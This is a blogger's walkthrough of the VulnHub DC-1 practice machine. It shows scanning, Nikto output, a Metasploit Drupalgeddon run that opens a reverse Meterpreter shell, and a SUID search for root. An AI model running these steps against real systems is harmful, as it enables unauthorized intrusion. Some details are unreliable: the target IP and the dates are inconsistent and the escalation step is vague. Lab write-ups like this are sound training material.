# VulnHub DC-1 Walkthrough: From Drupalgeddon to Root

**Date:** August 25, 2025
**Platform:** VulnHub
**Difficulty:** Beginner

## Introduction
DC-1 is a deliberately vulnerable machine designed for beginners to practice penetration testing skills. The goal is to get "root" access on the machine.

## Step 1: Reconnaissance
I started by finding the machine's IP address on my network using the `netdiscover -i eth0` command.

![Results of the netdiscover scan showing IP](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/netdiscover.png?raw=true)

Then, I scanned the machine with `nmap` to see what services are running :

![Results of the Nmap scan showing services](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/nmap%20service.png?raw=true)

```bash
nmap -sS -sV -O 10.0.2.7
```
*   **-O**: Checks for what operating system
*   **-sV**: Checks for the service version

  Then i also used nmap to run a script scan :

 ![Results of the Nmap scan showing services](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/nmap%20scriptscan.png?raw=true)

 Also the script scan showed that a robots.txt file was found,The scan showed port 80 was open, running a Drupal website.

 INFORMATION DISCLOSURE:
 server was revealing information about its version number :
 
 ![Results of the Apache info](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/apache.png?raw=true)

 I also used wappalyzer to see what technologies was used in building the website and i discovered drupal 7 was running revealing also the version number of the content management system (CMS).
 
 ![Results of the wappalyzer](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/wappalyzer.png?raw=true)
  


## Step 2: Discovering vulnerabilities - Using Nikto

 ## (root㉿kali) - [/home/atech] 
 
 ## nikto --host http://10.0.2.7
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.7
+ Target Hostname:    10.0.2.7
+ Target Port:        80
+ Start Time:         2025-11-15 12:28:05 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ /: Retrieved x-powered-by header: PHP/5.4.45-0+deb7u14.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal 7 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /robots.txt: Server may leak inodes via ETags, header found with file /robots.txt, inode: 152289, size: 1561, mtime: Wed Nov 20 21:45:59 2013. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /robots.txt: Entry '/INSTALL.sqlite.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/install.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/LICENSE.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/register/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/MAINTAINERS.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.mysql.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/xmlrpc.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/UPGRADE.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/register/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/INSTALL.pgsql.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 36 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /misc/favicon.ico: identifies this app/server as: Drupal 7.x. See: https://en.wikipedia.org/wiki/Favicon
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /web.config: ASP config file is accessible.

After using Nikto to scan for vulnerable services i decided to try manually using google to look for vulnerability on drupal7.I looked at exploi database on google and found a known vulnerabilty.

![Results of the exploitdb ](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/exploitdb.png?raw=true)

I also used built in searchsploit on my kali machine to search for vulnerabilty and i discovered there is a vulnerabilty that could make me add a user as an admin on the website.

![Results of searchsploit](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/searchsploit.png?raw=true)


I also used Metasploit framework to search for any vulnerabilty that i can use to gain shell access on the machine and i found one 

![Results of searchsploit]

 ## Vulnerable Services

 Drupal 7.x has a known vulnerability found in exploit database and on metasploit .

 1. Vulnerable to Remote Code Execution ( Drupalgeddon2   )


2. Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for t

   ## Step 3 :  Exploitation

I knew Drupal 7 was old and might have known vulnerabilities. I searched for "Drupal 7 exploit" and found "Drupalgeddon 2".

I searched On Metasploit and found it was vulnerable to Remote code execution.


I used a payload from metasploit on the target.

  Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ##LHOST                      yes      The listen address (an interface may be specified)
   
   ##LPORT     4444            yes      The listen port


##Exploit target:

  ##Id ##Name
  
   ##0   ##Drupal 7.0 - 7.31 (form-cache PHP injection method)



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/drupal_drupageddon) > set rhosts 10.0.2.5
rhosts => 10.0.2.5
msf6 exploit(multi/http/drupal_drupageddon) > run
[*] Started reverse TCP handler on :4444 
[*] Sending stage (40004 bytes) to 10.0.2.5
[*] Meterpreter session 1 opened (:4444 -> 10.0.2.5:50807) at 2025-08-21 13:01:57 +0100

It worked! I got a low-level shell on the machine.

meterpreter > sysinfo
Computer    : DC-1
OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
Meterpreter : php/linux
meterpreter > whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

  I found The first flag 

cat flag1.txt
Every good CMS needs a config file - and so do you.



## Step 3: Privilege Escalation - Becoming Root
I was logged in as a user called `www-data`. I needed to become `root`. 

Using The script to spawn the shell

Python -c 'import pty; pty.spawn("/bin/bash")'

Now we need to check for a config file since i can see a site folder in the directory





I looked for files with special permissions using the `find` command:

```bash
find / -perm -u=s -type f 2>/dev/null
```
I found a strange binary. When I ran it, it gave me a root shell! I used the `whoami` command to prove it:

```bash
whoami
# root
```

## Conclusion
This was a fun machine! I learned how to:
*   Use `nmap` for scanning.
*   Research and use a public exploit.
*   Escalate privileges on a Linux system.

**Remember: This was done on a practice machine from VulnHub. Always hack responsibly and only on systems you own or have permission to test!**
